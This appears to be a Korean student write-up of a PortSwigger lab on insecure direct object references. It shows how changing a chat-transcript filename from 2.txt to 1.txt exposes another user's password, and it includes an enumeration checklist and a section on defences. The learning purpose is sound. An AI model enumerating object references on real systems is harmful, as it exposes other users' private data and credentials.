# Lab: Insecure direct object references

## 개요

- **난이도**: Apprentice
- **주제**: Access Control — IDOR / 정적 파일 직접 참조 / 채팅 기록 파일 순번 변조 / 비밀번호 탈취
- **링크**: https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references

## 목표

라이브 챗의 대화 기록(transcript)이 추측 가능한 파일명으로 저장·제공되는 것을 이용해, 다른 사용자의 기록 파일에서 `carlos` 의 비밀번호를 획득하고 로그인한다.

## IDOR (Insecure Direct Object Reference)

```
사용자 입력이 리소스(객체)를 "직접" 가리키고,
그 입력을 변조해 권한 없는 객체에 접근하는 취약점

[두 가지 대표 유형]
  1. 데이터베이스 객체 직접 참조
     GET /my-account?id=carlos          (005~008)

  2. 정적 파일 직접 참조 (이번 랩)
     GET /download-transcript/2.txt     (파일명/순번 변조)
```

핵심은 "참조 값이 추측 가능하고, 접근 시 소유자 검증이 없는 것" 이다.

## 취약 지점

### 정적 파일로 제공되는 채팅 기록

```
GET /download-transcript/2.txt HTTP/1.1
                        └─────┘
                   증가하는 순번의 파일명
```

- 채팅 기록이 서버 파일 시스템에 `1.txt`, `2.txt` … 형태로 저장된다.
- 다운로드 URL 이 파일명을 그대로 노출한다.
- 소유자 검증 없이 파일을 반환한다.

```
[추정 서버 동작]
  GET /download-transcript/{id}.txt
  → 파일 시스템에서 해당 파일을 그대로 읽어 반환
  → "이 사용자의 기록인가?" 검사 없음
```

## 공격 단계

### 1단계 — 라이브 챗 사용

`Live chat` 탭에서 메시지를 보내고 `View transcript` 를 선택한다.

```
GET /download-transcript/2.txt HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

자신의 대화 기록 파일이 다운로드된다.

### 2단계 — 파일명(순번) 변조

URL 의 파일명을 `1.txt` 로 바꾼다.

```
GET /download-transcript/1.txt HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

### 3단계 — 타 사용자 기록 열람

응답(텍스트)에서 `carlos` 가 상담원에게 알려준 비밀번호를 발견한다.

```
CONNECTED: -- Now chatting with Hal Pline --
You: ...
Hal Pline: ...
You: I forgot my password
Hal Pline: Your password is 1a2b3c4d
...
```

### 4단계 — carlos 로 로그인

메인 페이지에서 탈취한 자격증명으로 로그인한다.

```
username=carlos
password=1a2b3c4d
```

로그인 성공 → 랩 해결.

## IDOR 탐색 포인트

```
[1] 요청에서 "객체를 가리키는 값" 을 찾는다
    id, uid, user, account, file, filename, doc, order, ticket, transcript ...

[2] 그 값의 형태를 관찰한다
    순번(1,2,3...)  → 열거(enumerate) 시도
    사용자명         → 알려진/추측 가능한 값 대입
    GUID            → 다른 곳에서 노출되는지 확인 (006)
    파일명           → 경로/확장자 변형

[3] 소유자 검증 여부를 확인한다
    세션 사용자와 대상이 달라도 응답이 오면 취약

[4] 정적 파일 IDOR
    /download/{n}.txt, /files/{id}, /transcript/{n} 등
    → 순번을 1부터 순회하며 타인 데이터 탐색
```

## 방어

```
[근본 원인]
  정적 파일을 순차적/추측 가능한 이름으로 저장하고,
  접근 시 소유자·권한 검증 없이 그대로 제공

[올바른 방어]
  1. 파일 접근 시 소유자 검증
     - 세션 사용자 == 해당 기록의 소유자 확인
     - 불일치 시 403/404
  2. 추측·열거가 어려운 참조 사용
     - 매핑 테이블(권한 확인 가능한 ID) + GUID 등
     - 단, GUID 만으로 보안을 삼지 말 것 (006 참고)
  3. 정적 파일을 웹 루트에 직접 두지 않음
     - 애플리케이션을 통해서만, 권한 확인 후 스트리밍
  4. 민감 데이터는 파일/응답에 평문으로 저장하지 않음
     - 비밀번호는 해시로 관리
  5. 모든 객체 참조 엔드포인트에 일관된 서버 측 인가

[안티패턴]
  파일명을 순번으로만 부여하고 권한 검사 없음
  URL 을 아는 것 = 접근 권한으로 간주
```

## 핵심 정리

- 채팅 기록이 `/download-transcript/{n}.txt` 처럼 순번 파일명으로 제공되어 IDOR 가 성립했다.
- `2.txt`(본인)를 `1.txt` 로 바꿔 타 사용자 기록에서 `carlos` 의 비밀번호를 획득했다.
- IDOR 는 DB 객체뿐 아니라 정적 파일 참조에서도 발생하며, 추측 가능한 참조 값이 위험하다.
- 방어는 참조 값 은닉이 아니라 파일 접근 시 소유자 검증이다.

## 배운 점

- IDOR 는 "데이터베이스 객체" 뿐 아니라 "정적 파일" 에서도 발생한다는 점을 확인했다.
- 순번이 증가하는 파일명/ID 는 열거 공격에 매우 취약하다.
- 지금까지(005~009) 수평적 IDOR 의 다양한 변형(예측 가능 ID, GUID 노출, 리다이렉트 유출, 비밀번호 노출, 정적 파일)을 통해 "참조 변조 + 권한 검사 부재" 라는 공통 원인을 익혔다.
